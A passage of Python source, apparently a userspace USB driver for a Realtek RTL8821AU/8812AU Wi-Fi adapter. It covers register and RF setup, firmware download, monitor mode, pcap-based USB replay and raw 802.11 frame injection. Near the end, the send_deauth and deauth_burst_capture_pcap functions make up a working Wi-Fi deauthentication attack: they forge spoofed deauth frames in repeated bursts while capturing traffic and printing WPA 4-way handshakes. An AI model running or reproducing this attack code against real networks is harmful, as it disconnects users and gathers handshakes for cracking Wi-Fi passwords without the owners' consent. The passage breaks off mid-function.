        self.write8(REG_USTIME_EDCA, 0x50)

        self.write8(REG_RXDMA_PRO_8812, 0x1E)

        self.write16(REG_RXDMA_AGG_PG_TH, 0x2005)

        self.write8(REG_HT_SINGLE_AMPDU_8812, self.read8(REG_HT_SINGLE_AMPDU_8812) | _bit(7))
        self.write8(REG_RX_PKT_LIMIT, 0x18)
        self.write8(REG_PIFS, 0x00)

        self.write16(REG_MAX_AGGR_NUM, 0x1F1F)
        self.write8(REG_FWHW_TXQ_CTRL, 0x80)
        self.write8(REG_AMPDU_MAX_TIME_8812, 0x5E)
        self.write32(REG_FAST_EDCA_CTRL, 0x03087777)

        self.write8(REG_RSV_CTRL, self.read8(REG_RSV_CTRL) | _bit(5) | _bit(6))

    def _enable_bb_sys(self) -> None:
        tmp = self.read8(REG_SYS_FUNC_EN)
        tmp |= FEN_USBA | FEN_BB_GLB_RSTn | FEN_BBRSTB
        self.write8(REG_SYS_FUNC_EN, tmp)
        self.write8(REG_RF_CTRL, 0x07)
        self.write8(REG_OPT_CTRL_8812 + 2, 0x07)

    def _bb_turn_on_block(self) -> None:
        self.set_bbreg(RFPGA0_RFMOD, bCCKEn, 0x1)
        self.set_bbreg(RFPGA0_RFMOD, bOFDMEn, 0x1)

    def _enable_rf(self) -> None:
        self.write8(REG_RF_CTRL, 0x07)
        val32 = self.read32(REG_OFDM0_TRX_PATH_ENABLE)
        val32 &= ~(OFDM_RF_PATH_RX_MASK | OFDM_RF_PATH_TX_MASK)
        val32 |= OFDM_RF_PATH_RX_A | OFDM_RF_PATH_TX_A
        self.write32(REG_OFDM0_TRX_PATH_ENABLE, val32)
        self.write8(REG_TXPAUSE, 0x00)

    def _bb_config_1t(self) -> None:
        self.set_bbreg(rRxPath_Jaguar, bRxPath_Jaguar, 0x11)
        self.set_bbreg(rTxPath_Jaguar, bMaskLWord, 0x1111)
        self.set_bbreg(rCCK_RX_Jaguar, bCCK_RX_Jaguar, 0x0)
        self.set_bbreg(0x8BC, 0xC0000060, 0x4)
        self.set_bbreg(0xE00, 0x0000000F, 0x4)
        self.set_bbreg(0xE90, 0xFFFFFFFF, 0x0)
        self.set_bbreg(0xE60, 0xFFFFFFFF, 0x0)
        self.set_bbreg(0xE64, 0xFFFFFFFF, 0x0)

    def hw_init_8821au(self) -> None:
        self.write8(REG_PBP, 0x30)
        self._init_queue_reserved_page_8821au()
        self._init_tx_buffer_boundary_8821au(TX_PAGE_BOUNDARY_8821)
        self._init_page_boundary_8821au()
        self._llt_table_init_8821au(TX_PAGE_BOUNDARY_8821)

        self._init_tdectrl_8821au()
        self._init_hardware_drop_incorrect_bulk_out()
        self._init_rx_setting_8812au()
        self._init_early_mode()
        self.write8(REG_HMTFR, 0x0F)

        self._config_mac_with_headerfile_8821au()
        self._init_trxdma_ctrl_8821au()
        self._init_usb_special_option()
        self._usb_rx_aggregation_enable()
        self._enable_bb_sys()
        self._config_bb_with_headerfile_8821au()
        self._config_agc_with_headerfile_8821au()
        self._config_radioa_with_headerfile_8821au()
        self._bb_config_1t()
        self._bb_turn_on_block()
        self._enable_rf()
        self.init_mac_rx_tx()
        self.set_monitor_mode()
        self._init_burst_pkt_len_8821u()
        self.enable_mac_tx_rx()
        self._init_burst_pkt_len_8821u()

    def set_channel(self, channel: int, *, bandwidth_mhz: int = 20) -> None:
        if channel <= 0 or channel > 196:
            raise ValueError("channel out of range")
        if bandwidth_mhz not in (20, 40, 80):
            raise ValueError("bandwidth_mhz must be 20, 40, or 80")

        if 36 <= channel <= 48:
            fc_area = 0x494
        elif 50 <= channel <= 64:
            fc_area = 0x453
        elif 100 <= channel <= 116:
            fc_area = 0x452
        elif 118 <= channel:
            fc_area = 0x412
        else:
            fc_area = 0x96A

        self.set_bbreg(rFc_area_Jaguar, 0x1FFE0000, fc_area)

        if 36 <= channel <= 64:
            mod_ag = 0x101
        elif 100 <= channel <= 140:
            mod_ag = 0x301
        elif 140 < channel:
            mod_ag = 0x501
        else:
            mod_ag = 0x000

        self.set_rfreg(0, RF_CHNLBW_JAGUAR, _bit(18) | _bit(17) | _bit(16) | _bit(9) | _bit(8), mod_ag)

        bw_bits = 3 if bandwidth_mhz == 20 else (1 if bandwidth_mhz == 40 else 0)
        self.set_rfreg(0, RF_CHNLBW_JAGUAR, _bit(11) | _bit(10), bw_bits)
        self.set_rfreg(0, RF_CHNLBW_JAGUAR, MASKBYTE0, channel)

    def _pwr_write8(self, addr: int, mask: int, value: int) -> None:
        cur = self.read8(addr)
        cur &= (~mask) & 0xFF
        cur |= value & mask & 0xFF
        self.write8(addr, cur)

    def _pwr_poll8(self, addr: int, mask: int, value: int, *, timeout_ms: int = 50) -> None:
        want = value & mask & 0xFF
        t0 = time.monotonic()
        while (time.monotonic() - t0) * 1000.0 < timeout_ms:
            cur = self.read8(addr) & mask & 0xFF
            if cur == want:
                return
        raise RuntimeError(f"pwrseq poll timeout addr=0x{addr:04x} mask=0x{mask:02x} want=0x{want:02x}")

    def power_on_8821a_usb(self, *, debug: bool = False) -> None:
        steps = [
            ("write", 0x0005, _bit(3) | _bit(7), 0x00),
            ("write", 0x004A, _bit(0), 0x00),
            ("write", 0x0005, _bit(3) | _bit(4), 0x00),
            ("write", 0x0020, _bit(0), _bit(0)),
            ("write", 0x0067, _bit(4), 0x00),
            ("delay_ms", 1, 0, 0),
            ("write", 0x0000, _bit(5), 0x00),
            ("write", 0x0005, _bit(2), 0x00),
            ("poll", 0x0006, _bit(1), _bit(1)),
            ("write", 0x0006, _bit(0), _bit(0)),
            ("write", 0x0005, _bit(7), 0x00),
            ("write", 0x0005, _bit(4) | _bit(3), 0x00),
            ("write", 0x0005, _bit(0), _bit(0)),
            ("poll", 0x0005, _bit(0), 0x00),
            ("write", 0x004F, _bit(0), _bit(0)),
            ("write", 0x0067, _bit(5) | _bit(4), _bit(5) | _bit(4)),
            ("write", 0x0025, _bit(6), 0x00),
            ("write", 0x0049, _bit(1), _bit(1)),
            ("write", 0x0063, _bit(1), _bit(1)),
            ("write", 0x0062, _bit(1), 0x00),
            ("write", 0x0058, _bit(0), _bit(0)),
            ("write", 0x005A, _bit(1), _bit(1)),
            ("write", 0x002E, 0xFF, 0x82),
        ]

        for op, a, m, v in steps:
            if op == "write":
                if debug:
                    before = self.read8(a)
                self._pwr_write8(a, m, v)
                if debug:
                    after = self.read8(a)
                    print(f"[pwr] write 0x{a:04x} mask=0x{m:02x} val=0x{v:02x} {before:02x}->{after:02x}")
            elif op == "poll":
                if debug:
                    print(f"[pwr] poll  0x{a:04x} mask=0x{m:02x} val=0x{v:02x}")
                self._pwr_poll8(a, m, v)
            elif op == "delay_ms":
                time.sleep(a / 1000.0)
            else:
                raise RuntimeError(f"unknown pwrseq op {op}")

        self.write16(REG_CR, 0x0000)
        cr = self.read16(REG_CR)
        cr |= (
            _bit(0)
            | _bit(1)
            | _bit(2)
            | _bit(3)
            | _bit(4)
            | _bit(5)
            | _bit(9)
            | _bit(10)
        )
        self.write16(REG_CR, cr)

        sys_cfg3 = self.read8(REG_SYS_CFG + 3)
        if (sys_cfg3 & _bit(0)) != 0:
            v7c = self.read8(0x007C)
            self.write8(0x007C, v7c | _bit(6))

    def firmware_selfreset_8821(self) -> None:
        tmp2 = self.read8(REG_RSV_CTRL + 1)
        self.write8(REG_RSV_CTRL + 1, tmp2 & ~0x01)
        tmp = self.read8(REG_SYS_FUNC_EN + 1)
        self.write8(REG_SYS_FUNC_EN + 1, tmp & ~(1 << 2))
        self.write8(REG_RSV_CTRL + 1, tmp2 | 0x01)
        self.write8(REG_SYS_FUNC_EN + 1, tmp | (1 << 2))

    def firmware_selfreset_8812(self) -> None:
        tmp2 = self.read8(REG_RSV_CTRL + 1)
        self.write8(REG_RSV_CTRL + 1, tmp2 & ~(1 << 3))
        tmp = self.read8(REG_SYS_FUNC_EN + 1)
        self.write8(REG_SYS_FUNC_EN + 1, tmp & ~(1 << 2))
        self.write8(REG_RSV_CTRL + 1, tmp2 | (1 << 3))
        self.write8(REG_SYS_FUNC_EN + 1, tmp | (1 << 2))

    def firmware_selfreset_auto(self) -> None:
        self.firmware_selfreset_8821()
        v = self.read8(REG_SYS_FUNC_EN + 1)
        if (v & (1 << 2)) == 0:
            self.firmware_selfreset_8812()

    def _enable_fw_download(self, enable: bool) -> None:
        if enable:
            tmp = self.read8(REG_MCUFWDL)
            self.write8(REG_MCUFWDL, tmp | MCUFWDL_EN)
            tmp2 = self.read8(REG_MCUFWDL + 2)
            self.write8(REG_MCUFWDL + 2, tmp2 & 0xF7)
        else:
            tmp = self.read8(REG_MCUFWDL)
            self.write8(REG_MCUFWDL, tmp & ~MCUFWDL_EN)

    def _set_fw_page(self, page: int) -> None:
        cur = self.read8(REG_MCUFWDL + 2)
        self.write8(REG_MCUFWDL + 2, (cur & 0xF8) | (page & 0x07))

    def _block_write_fw(self, base_addr: int, data: bytes) -> None:
        off = 0
        while off + MAX_REG_BOLCK_SIZE <= len(data):
            chunk = data[off : off + MAX_REG_BOLCK_SIZE]
            self.writeN(base_addr + off, chunk)
            off += MAX_REG_BOLCK_SIZE

        remain = data[off:]
        off2 = 0
        while off2 + 8 <= len(remain):
            self.writeN(base_addr + off + off2, remain[off2 : off2 + 8])
            off2 += 8

        for i in range(off2, len(remain)):
            self.write8(base_addr + off + i, remain[i])

    def download_firmware(self, fw_bytes: bytes, *, debug: bool = False, retries: int = 3) -> None:
        sig = int.from_bytes(fw_bytes[0:2], "little")
        if (sig & 0xFFF0) in (0x9500, 0x2100) and len(fw_bytes) >= 32:
            fw_bytes = fw_bytes[32:]

        if retries < 1:
            raise ValueError("retries must be >= 1")

        last_mcu = None
        for attempt in range(1, retries + 1):
            last_mcu = self.read32(REG_MCUFWDL)
            if debug:
                print(f"[fw] attempt={attempt} mcu_fw_dl=0x{last_mcu:08x}")

            if self.read8(REG_MCUFWDL) & RAM_DL_SEL:
                self.write8(REG_MCUFWDL, 0x00)
                self.firmware_selfreset_auto()

            self._enable_fw_download(True)
            self.write8(REG_MCUFWDL, self.read8(REG_MCUFWDL) | FWDL_ChkSum_rpt)

            pages = len(fw_bytes) // MAX_DLFW_PAGE_SIZE
            remain = len(fw_bytes) % MAX_DLFW_PAGE_SIZE
            for page in range(pages):
                self._set_fw_page(page)
                chunk = fw_bytes[page * MAX_DLFW_PAGE_SIZE : (page + 1) * MAX_DLFW_PAGE_SIZE]
                self._block_write_fw(FW_8821AU_START_ADDRESS, chunk)

            if remain:
                page = pages
                self._set_fw_page(page)
                chunk = fw_bytes[pages * MAX_DLFW_PAGE_SIZE :]
                self._block_write_fw(FW_8821AU_START_ADDRESS, chunk)

            self._enable_fw_download(False)

            t0 = time.monotonic()
            while (time.monotonic() - t0) < 1.0:
                last_mcu = self.read32(REG_MCUFWDL)
                if last_mcu & FWDL_ChkSum_rpt:
                    break
            else:
                if debug:
                    print(f"[fw] checksum timeout mcu_fw_dl=0x{last_mcu:08x}")
                self.firmware_selfreset_auto()
                continue

            v = self.read32(REG_MCUFWDL)
            v |= MCUFWDL_RDY
            v &= ~WINTINI_RDY
            self.write32(REG_MCUFWDL, v)
            self.firmware_selfreset_auto()

            t0 = time.monotonic()
            while (time.monotonic() - t0) < 1.0:
                last_mcu = self.read32(REG_MCUFWDL)
                if last_mcu & WINTINI_RDY:
                    return
            if debug:
                print(f"[fw] ready timeout mcu_fw_dl=0x{last_mcu:08x}")

        raise RuntimeError("firmware download failed after retries")

    def init_mac_rx_tx(self) -> None:
        self.write8(REG_PBP, (0x3 << 4) & 0xF0)
        self.write8(REG_RX_DRVINFO_SZ, DRVINFO_SZ & 0xFF)

        cr32 = self.read32(REG_CR)
        self.write32(REG_CR, (cr32 & ~MASK_NETTYPE) | ((NT_LINK_AP << 16) & MASK_NETTYPE))

        self.write16(REG_CR, 0x0000)
        cur16 = self.read16(REG_CR)
        cur16 |= (HCI_TXDMA_EN | HCI_RXDMA_EN | TXDMA_EN | RXDMA_EN | PROTOCOL_EN | SCHEDULE_EN | ENSEC | CALTMR_EN)
        self.write16(REG_CR, cur16)

        self.write32(REG_MAR + 0, 0xFFFFFFFF)
        self.write32(REG_MAR + 4, 0xFFFFFFFF)

        self.write32(REG_RCR, 0xF410400E)
        self.write16(REG_RXFLTMAP0, 0xFFFF)
        self.write16(REG_RXFLTMAP1, 0x0004)
        self.write16(REG_RXFLTMAP2, 0xFFFF)

    def enable_mac_tx_rx(self) -> None:
        cur = self.read8(REG_CR)
        self.write8(REG_CR, cur | MACTXEN | MACRXEN)

    def set_monitor_mode(self) -> None:
        msr = self.read8(REG_MSR)
        self.write8(REG_MSR, msr & 0x0C)

        rcr_bits = (
            RCR_AAP
            | RCR_APM
            | RCR_AM
            | RCR_AB
            | RCR_APWRMGT
            | RCR_ADF
            | RCR_ACF
            | RCR_AMF
            | RCR_ACRC32
            | RCR_AICV
            | RCR_HTC_LOC_CTRL
            | RCR_APP_PHYST_RXFF
            | RCR_APP_ICV
            | RCR_APP_MIC
            | RCR_APPFCS
            | FORCEACK
        )
        self.write32(REG_RCR, rcr_bits)

        rxflt1 = self.read16(REG_RXFLTMAP1)
        self.write16(REG_RXFLTMAP1, rxflt1 | _bit(8))
        self.write16(REG_RXFLTMAP2, 0xFFFF)

    def set_sitesurvey_filters(self, enable: bool) -> None:
        rcr = self.read32(REG_RCR)
        if enable:
            self.write32(REG_RCR, rcr & ~RCR_CBSSID_BCN)
            self.write16(REG_RXFLTMAP0, 0xFFFF)
            self.write16(REG_RXFLTMAP2, 0x0000)
        else:
            self.write32(REG_RCR, rcr | RCR_CBSSID_BCN)
            self.write16(REG_RXFLTMAP2, 0xFFFF)

    def bulk_read(self, *, ep_addr: Optional[int] = None, size: int = 16384, timeout_ms: int = 1000) -> bytes:
        if self.dev is None:
            raise RuntimeError("device not open")
        if ep_addr is None:
            ep = self.bulk_in_eps[0]
        else:
            ep = next((e for e in self.bulk_in_eps if e.bEndpointAddress == ep_addr), None)
            if ep is None:
                raise ValueError(f"bulk IN endpoint 0x{ep_addr:02x} not found")
        try:
            data = ep.read(size, timeout=timeout_ms)
            return bytes(data)
        except usb.core.USBTimeoutError:
            return b""

    def bulk_read_ep(self, ep_addr: int, *, size: int, timeout_ms: int) -> bytes:
        if self.dev is None:
            raise RuntimeError("device not open")
        try:
            data = self.dev.read(ep_addr, size, timeout=timeout_ms)
            return bytes(data)
        except usb.core.USBTimeoutError:
            return b""

    def bulk_write(self, data: bytes, *, ep_addr: Optional[int] = None, timeout_ms: int = 5000) -> int:
        if self.dev is None:
            raise RuntimeError("device not open")
        if ep_addr is None:
            ep = self.bulk_out_eps[0]
        else:
            ep = next((e for e in self.bulk_out_eps if e.bEndpointAddress == ep_addr), None)
            if ep is None:
                raise ValueError(f"bulk OUT endpoint 0x{ep_addr:02x} not found")
        return ep.write(data, timeout=timeout_ms)

    def bulk_write_ep(self, ep_addr: int, data: bytes, *, timeout_ms: int) -> int:
        if self.dev is None:
            raise RuntimeError("device not open")
        return int(self.dev.write(ep_addr, data, timeout=timeout_ms))

    def replay_all_usb_requests_from_pcap(
        self,
        pcap_path: str,
        *,
        display_filter: str,
        timeout_ms: int = 1000,
        bulk_in_default_size: int = 32768,
        sleep: bool = False,
        max_sleep_ms: int = 5,
        dry_run: bool = False,
        limit: int = 0,
        debug: bool = False,
        verify_in: bool = True,
        verify_in_mode: str = "bytes",
        only_rtw_vendor_req: bool = False,
        report_mismatch: int = 0,
        report_errors: int = 0,
    ) -> dict[str, object]:
        if shutil.which("tshark") is None:
            raise RuntimeError("tshark not found in PATH")
        args = [
            "tshark",
            "-r",
            pcap_path,
            "-Y",
            display_filter,
            "-T",
            "fields",
            "-E",
            "separator=\t",
            "-e",
            "frame.number",
            "-e",
            "frame.time_relative",
            "-e",
            "usb.transfer_type",
            "-e",
            "usb.urb_type",
            "-e",
            "usb.urb_id",
            "-e",
            "usb.endpoint_address",
            "-e",
            "usb.urb_len",
            "-e",
            "usb.data_len",
            "-e",
            "usb.capdata",
            "-e",
            "usb.bmRequestType",
            "-e",
            "usb.setup.bRequest",
            "-e",
            "usb.setup.wValue",
            "-e",
            "usb.setup.wIndex",
            "-e",
            "usb.setup.wLength",
            "-e",
            "usb.data_fragment",
            "-e",
            "usb.control.Response",
        ]
        proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False, text=True)
        if proc.returncode != 0:
            msg = proc.stderr.strip() or f"tshark failed with code {proc.returncode}"
            raise RuntimeError(msg)

        recs: list[_PcapUsbRecord] = []
        for line in proc.stdout.splitlines():
            if not line.strip():
                continue
            fields = line.split("\t")
            if len(fields) < 16:
                continue
            (
                frame_no_s,
                time_rel_s,
                transfer_type_s,
                urb_type,
                urb_id,
                ep_addr_s,
                urb_len_s,
                data_len_s,
                capdata,
                bm_req_s,
                b_req_s,
                w_value_s,
                w_index_s,
                w_len_s,
                data_fragment,
                control_response,
                *_,
            ) = fields + [""] * 4

            try:
                frame_no = int(frame_no_s)
            except ValueError:
                continue
            try:
                time_rel = float(time_rel_s) if time_rel_s else 0.0
            except ValueError:
                time_rel = 0.0
            try:
                transfer_type = int(transfer_type_s, 0) if transfer_type_s else -1
            except ValueError:
                transfer_type = -1
            try:
                ep_addr = int(ep_addr_s, 0) if ep_addr_s else -1
            except ValueError:
                ep_addr = -1
            try:
                urb_len = int(urb_len_s, 0) if urb_len_s else 0
            except ValueError:
                urb_len = 0
            try:
                data_len = int(data_len_s, 0) if data_len_s else 0
            except ValueError:
                data_len = 0

            bm_req = None
            b_req = None
            w_value = None
            w_index = None
            w_len = None
            if bm_req_s:
                try:
                    bm_req = int(bm_req_s, 0) & 0xFF
                except ValueError:
                    bm_req = None
            if b_req_s:
                try:
                    b_req = int(b_req_s, 0) & 0xFF
                except ValueError:
                    b_req = None
            if w_value_s:
                try:
                    w_value = int(w_value_s, 0) & 0xFFFF
                except ValueError:
                    w_value = None
            if w_index_s:
                try:
                    w_index = int(w_index_s, 0) & 0xFFFF
                except ValueError:
                    w_index = None
            if w_len_s:
                try:
                    w_len = int(w_len_s, 0) & 0xFFFF
                except ValueError:
                    w_len = None

            recs.append(
                _PcapUsbRecord(
                    frame_no=frame_no,
                    time_rel=time_rel,
                    transfer_type=transfer_type,
                    urb_type=urb_type,
                    urb_id=urb_id,
                    endpoint_address=ep_addr,
                    urb_len=urb_len,
                    data_len=data_len,
                    capdata_hex=capdata or "",
                    bm_request_type=bm_req,
                    b_request=b_req,
                    w_value=w_value,
                    w_index=w_index,
                    w_length=w_len,
                    data_fragment_hex=data_fragment or "",
                    control_response_hex=control_response or "",
                )
            )

        subs = [r for r in recs if r.urb_type == "'S'"]
        comps = [r for r in recs if r.urb_type == "'C'"]
        comps_by_id: dict[str, list[_PcapUsbRecord]] = {}
        for r in sorted(comps, key=lambda x: x.frame_no):
            comps_by_id.setdefault(r.urb_id, []).append(r)
        comp_pos: dict[str, int] = {k: 0 for k in comps_by_id.keys()}

        stats = {
            "submissions": 0,
            "control": 0,
            "bulk": 0,
            "skipped": 0,
            "errors": 0,
            "in_verified": 0,
            "in_mismatch": 0,
        }
        mismatch_frames: list[int] = []
        error_frames: list[int] = []

        last_t: Optional[float] = None
        for r in sorted(subs, key=lambda x: x.frame_no):
            if limit and stats["submissions"] >= limit:
                break
            if sleep:
                if last_t is not None:
                    dt_ms = (r.time_rel - last_t) * 1000.0
                    if dt_ms > 0:
                        time.sleep(min(dt_ms, float(max(0, int(max_sleep_ms)))) / 1000.0)
                last_t = r.time_rel

            stats["submissions"] += 1

            completion = None
            if r.urb_id in comps_by_id:
                i = comp_pos.get(r.urb_id, 0)
                lst = comps_by_id[r.urb_id]
                while i < len(lst) and lst[i].frame_no < r.frame_no:
                    i += 1
                if i < len(lst):
                    completion = lst[i]
                    comp_pos[r.urb_id] = i + 1

            try:
                if r.transfer_type == 0x02:
                    stats["control"] += 1
                    if r.bm_request_type is None or r.b_request is None:
                        stats["skipped"] += 1
                        if debug:
                            print(f"[replay] skipped control frame={r.frame_no} urb={r.urb_id}")
                        continue
                    bm = r.bm_request_type
                    breq = r.b_request
                    wv = int(r.w_value or 0) & 0xFFFF
                    wi = int(r.w_index or 0) & 0xFFFF
                    wlen = int(r.w_length or 0)
                    if only_rtw_vendor_req and not (bm in (0x40, 0xC0) and breq == 5 and wi == 0):
                        stats["skipped"] += 1
                        continue
                    is_in = bool(bm & 0x80)
                    if dry_run:
                        continue
                    if is_in:
                        got = bytes(
                            self.dev.ctrl_transfer(bm, breq, wv, wi, wlen, timeout=timeout_ms)  # type: ignore[union-attr]
                        )
                        if verify_in and completion is not None:
                            want = b""
                            if completion.capdata_hex:
                                want = _hex_to_bytes(completion.capdata_hex)
                            elif completion.control_response_hex:
                                want = _hex_to_bytes(completion.control_response_hex)
                            if want:
                                ok = (got == want) if verify_in_mode == "bytes" else (len(got) == len(want))
                                if ok:
                                    stats["in_verified"] += 1
                                else:
                                    stats["in_mismatch"] += 1
                                    if report_mismatch and len(mismatch_frames) < int(report_mismatch):
                                        mismatch_frames.append(r.frame_no)
                                    if debug:
                                        print(
                                            f"[replay] mismatch control-in frame={r.frame_no} urb={r.urb_id} got={len(got)} want={len(want)}"
                                        )
                    else:
                        payload_hex = r.data_fragment_hex or r.capdata_hex
                        payload = _hex_to_bytes(payload_hex) if payload_hex else b""
                        if wlen and len(payload) != wlen:
                            payload = payload[:wlen]
                        self.dev.ctrl_transfer(bm, breq, wv, wi, payload, timeout=timeout_ms)  # type: ignore[union-attr]
                elif r.transfer_type == 0x03:
                    stats["bulk"] += 1
                    if r.endpoint_address < 0:
                        stats["skipped"] += 1
                        if debug:
                            print(f"[replay] skipped bulk frame={r.frame_no} urb={r.urb_id}")
                        continue
                    ep = r.endpoint_address & 0xFF
                    is_in = bool(ep & 0x80)
                    if dry_run:
                        continue
                    if is_in:
                        want_len = 0
                        if completion is not None and completion.data_len:
                            want_len = int(completion.data_len)
                        if want_len <= 0 and completion is not None and completion.capdata_hex:
                            want_len = len(_hex_to_bytes(completion.capdata_hex))
                        size = int(r.urb_len or 0) or (want_len if want_len > 0 else int(bulk_in_default_size))
                        got = self.bulk_read_ep(ep, size=size, timeout_ms=timeout_ms)
                        if verify_in and completion is not None and completion.capdata_hex:
                            want = _hex_to_bytes(completion.capdata_hex)
                            if want:
                                ok = (got == want) if verify_in_mode == "bytes" else (len(got) == len(want))
                                if ok:
                                    stats["in_verified"] += 1
                                else:
                                    stats["in_mismatch"] += 1
                                    if report_mismatch and len(mismatch_frames) < int(report_mismatch):
                                        mismatch_frames.append(r.frame_no)
                                    if debug:
                                        print(f"[replay] mismatch bulk-in frame={r.frame_no} ep=0x{ep:02x} got={len(got)} want={len(want)}")
                    else:
                        payload_hex = r.capdata_hex or r.data_fragment_hex
                        payload = _hex_to_bytes(payload_hex) if payload_hex else b""
                        self.bulk_write_ep(ep, payload, timeout_ms=timeout_ms)
                else:
                    stats["skipped"] += 1
            except usb.core.USBError as e:
                stats["errors"] += 1
                if report_errors and len(error_frames) < int(report_errors):
                    error_frames.append(r.frame_no)
                if debug:
                    print(f"[replay] usb error frame={r.frame_no} type={r.transfer_type} urb={r.urb_id} err={e}")

        out: dict[str, object] = dict(stats)
        if mismatch_frames:
            out["mismatch_frames"] = mismatch_frames
        if error_frames:
            out["error_frames"] = error_frames
        return out

    def tx_mgmt_frame(self, frame: bytes, *, ep_addr: Optional[int] = None) -> int:
        desc = build_mgmt_txdesc(len(frame))
        ep = self.bulk_out_eps[0] if ep_addr is None else next(
            (e for e in self.bulk_out_eps if e.bEndpointAddress == ep_addr), None
        )
        if ep is None:
            raise ValueError(f"bulk OUT endpoint 0x{ep_addr:02x} not found")
        wMaxPacketSize = getattr(ep, "wMaxPacketSize", 512) or 512

        payload = bytearray(desc)
        payload += frame
        if (len(payload) % wMaxPacketSize) == 0:
            payload += b"\x00" * 8
        return self.bulk_write(bytes(payload), ep_addr=ep.bEndpointAddress)

    def tx_frame(self, frame: bytes, *, ep_addr: Optional[int] = None) -> int:
        if len(frame) < 2:
            raise ValueError("frame too short")
        fc = int.from_bytes(frame[0:2], "little")
        ftype = (fc >> 2) & 0x3
        subtype = (fc >> 4) & 0xF

        to_ds = ((fc >> 8) & 1) == 1
        from_ds = ((fc >> 9) & 1) == 1

        a1 = frame[4:10] if len(frame) >= 10 else None
        bmc = _is_broadcast_or_multicast(a1)

        queue_sel = QSLT_MGNT
        qos = False
        if ftype == 2:
            qos = (subtype & 0x08) != 0
            if qos:
                hdr_len = 30 if (to_ds and from_ds) else 24
                tid = frame[hdr_len] & 0x0F if len(frame) >= (hdr_len + 2) else 0
                if tid in (1, 2):
                    queue_sel = QSLT_BK
                elif tid in (4, 5):
                    queue_sel = QSLT_VI
                elif tid in (6, 7):
                    queue_sel = QSLT_VO
                else:
                    queue_sel = QSLT_BE
            else:
                queue_sel = QSLT_BE

        desc = build_txdesc(len(frame), queue_sel=queue_sel, qos=qos, bmc=bmc)
        ep = self.bulk_out_eps[0] if ep_addr is None else next(
            (e for e in self.bulk_out_eps if e.bEndpointAddress == ep_addr), None
        )
        if ep is None:
            raise ValueError(f"bulk OUT endpoint 0x{ep_addr:02x} not found")
        wMaxPacketSize = getattr(ep, "wMaxPacketSize", 512) or 512

        payload = bytearray(desc)
        payload += frame
        if (len(payload) % wMaxPacketSize) == 0:
            payload += b"\x00" * 8
        return self.bulk_write(bytes(payload), ep_addr=ep.bEndpointAddress)

    def send_deauth(
        self,
        *,
        dest: str,
        bssid: str,
        source: Optional[str] = None,
        reason: int = 7,
        ep_out: Optional[int] = None,
    ) -> int:
        if source is None:
            source = bssid
        da = _parse_mac(dest)
        sa = _parse_mac(source)
        bssid_bytes = _parse_mac(bssid)

        fc = 0x00C0
        duration = 0x013A
        seq_ctrl = (int(self.tx_seq) & 0xFFF) << 4
        self.tx_seq = (int(self.tx_seq) + 1) & 0xFFF

        header = struct.pack("<HH", fc, duration) + da + sa + bssid_bytes + struct.pack("<H", seq_ctrl)
        body = struct.pack("<H", int(reason) & 0xFFFF)
        return self.tx_frame(header + body, ep_addr=ep_out)

    def deauth_burst_capture_pcap(
        self,
        *,
        pcap: "PcapWriter",
        dest: str,
        bssid: str,
        source: Optional[str],
        reason: int,
        burst_size: int,
        interval_ms: int,
        duration_s: float,
        ep_in: Optional[int],
        ep_out: Optional[int],
        channel: int,
        read_size: int,
        timeout_ms: int,
        include_bad_fcs: bool,
        keep_fcs: bool,
    ) -> tuple[int, int]:
        if burst_size <= 0:
            raise ValueError("burst_size must be > 0")
        if interval_ms <= 0:
            raise ValueError("interval_ms must be > 0")

        start = time.monotonic()
        end = None if duration_s <= 0 else (start + float(duration_s))
        next_send = start

        sent = 0
        written = 0
        led_is_on = False
        led_off_at: Optional[float] = None
        try:
            while True:
                now = time.monotonic()
                if end is not None and now >= end:
                    break

                if led_is_on and led_off_at is not None and now >= led_off_at:
                    try:
                        self.led_set(False)
                    except Exception:
                        pass
                    led_is_on = False
                    led_off_at = None

                if now >= next_send:
                    for _ in range(burst_size):
                        self.send_deauth(dest=dest, bssid=bssid, source=source, reason=reason, ep_out=ep_out)
                        sent += 1
                    next_send += interval_ms / 1000.0
                    if next_send < now:
                        next_send = now + (interval_ms / 1000.0)

                raw = self.bulk_read(ep_addr=ep_in, size=read_size, timeout_ms=timeout_ms)
                if not raw:
                    continue
                for pkt in parse_rx_agg(raw):
                    frame = pkt.frame
                    if not include_bad_fcs and (pkt.crc_err or pkt.icv_err):
                        continue
                    if _fc_version(frame) != 0:
                        continue
                    if len(frame) < 2:
                        continue

                    flags: Optional[int] = None
                    if keep_fcs:
                        flags_val = 0x10
                        if pkt.crc_err:
                            flags_val |= 0x40
                        flags = flags_val
                    else:
                        frame, _ = _strip_fcs_if_present(frame)

                    _print_4way_if_present(frame)

                    tsft = int(time.time() * 1_000_000)
                    rtap = _radiotap_header(tsft=tsft, channel=int(channel), flags=flags)
                    pcap.write_packet(rtap + frame)
                    written += 1

                    if not led_is_on:
                        try:
                            self.led_set(True)
                        except Exception:
                            pass
                        led_is_on = True
                    led_off_at = time.monotonic() + 0.1
        finally:
            try:
                self.led_set(False)
            except Exception:
                pass
            pcap.flush()
        return sent, written


def _parse_int(s: str) -> int:
    s = s.strip().lower()
    if s.startswith("0x"):
        return int(s, 16)
    return int(s, 10)

def _parse_channels(s: str) -> list[int]:
    s = s.strip()
    if not s:
        return []
    out: list[int] = []
    for part in s.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            lo = int(a.strip(), 10)
            hi = int(b.strip(), 10)
            if lo > hi:
                lo, hi = hi, lo
            out.extend(range(lo, hi + 1))
        else:
            out.append(int(part, 10))
    seen = set()
    uniq: list[int] = []
    for ch in out:
        if ch in seen:
            continue
        seen.add(ch)
        uniq.append(ch)
    return uniq


def _hex_to_bytes(s: str) -> bytes:
    s = s.strip().replace(" ", "").replace(":", "")
    if not s:
        return b""
    return binascii.unhexlify(s)

def _parse_mac(s: str) -> bytes:
    b = _hex_to_bytes(s.replace("-", ":"))
    if len(b) != 6:
        raise ValueError(f"invalid MAC: {s!r}")
    return b

def _fmt_mac(mac: Optional[bytes]) -> str:
    if not mac or len(mac) != 6:
        return "??:??:??:??:??:??"
    return ":".join(f"{b:02x}" for b in mac)

def _is_unicast_mac(addr: Optional[bytes]) -> bool:
    if addr is None or len(addr) != 6:
        return False
    if addr == b"\x00\x00\x00\x00\x00\x00":
        return False
    if addr == b"\xff\xff\xff\xff\xff\xff":
        return False
    if addr[0] & 0x01:
        return False
    return True

def _chan_to_freq_mhz(ch: int) -> int:
    if ch == 14:
        return 2484
    if 1 <= ch <= 13:
        return 2407 + ch * 5
    if 36 <= ch <= 177:
